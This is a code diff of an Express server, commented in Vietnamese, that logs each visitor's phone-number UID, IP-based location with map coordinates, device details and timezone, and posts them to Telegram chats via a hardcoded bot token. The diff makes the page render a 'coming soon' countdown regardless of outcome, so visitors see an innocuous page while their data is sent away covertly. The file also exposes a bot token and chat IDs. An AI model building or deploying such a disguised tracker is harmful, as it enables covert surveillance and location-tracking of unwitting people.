@@ -5,11 +5,16 @@ const UAParser = require('ua-parser-js');
 const app = express();
 const PORT = 3000;
 
+app.set('view engine', 'ejs');
+app.set('views', __dirname + '/views'); // thư mục chứa file .ejs
+app.use(express.static('public'));
+
+
 // Token Telegram & danh sách chat_id
 const TELEGRAM_TOKEN = '7903084653:AAFzYR7ZWNK7Zq_elua_tB1fksolyTtzoK8';
 const CHAT_IDS = [
   '5085998678', // bạn
-//   '6284672384'
+  //   '6284672384'
   // '1234567890', // đối tác khác nếu cần
 ];
 
@@ -68,7 +73,7 @@ app.get('/', async (req, res) => {
     const lon = ipInfo.data.lon || 'Unknown';
     const timezone = ipInfo.data.timezone || 'Unknown';
 
-    // 📝 Nội dung gửi Telegram
+    // 📱 Phân tích thiết bị
     const output = `
 📥 *New Visitor From ZNS*
 📞 UID (SĐT): *${uid}*
@@ -78,9 +83,8 @@ app.get('/', async (req, res) => {
 📍 Location: ${city}, ${country} (${zip})
 📌 Lat/Lon: [${lat}, ${lon}](https://maps.google.com/?q=${lat},${lon})
 🕒 Time: ${time} (${timezone})
-    `.trim();
+  `.trim();
 
-    // 🚀 Gửi thông tin đến tất cả chat_id
     for (const chatId of CHAT_IDS) {
       try {
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -94,11 +98,16 @@ app.get('/', async (req, res) => {
       }
     }
 
-    res.send(`<pre>✅ Đã gửi thông tin cho ${CHAT_IDS.length} người trên Telegram!</pre>`);
   } catch (err) {
-    console.error(`❌ Lỗi lấy thông tin IP: ${err.message}`);
-    res.status(500).send('❌ Lỗi khi truy xuất hoặc gửi dữ liệu');
+    // 👉 BÁO lỗi nhưng không dừng render trang
+    console.error('❌ Lỗi trong quá trình lấy IP hoặc gửi Telegram:', err.message);
   }
+
+  // 🧾 Dù lỗi hay không, vẫn render giao diện
+  res.render('coming_soon', {
+    countdownDeadline: new Date('2025-08-08T23:59:59').toISOString()
+  });
+
 });
 
 app.listen(PORT, '0.0.0.0', () => {
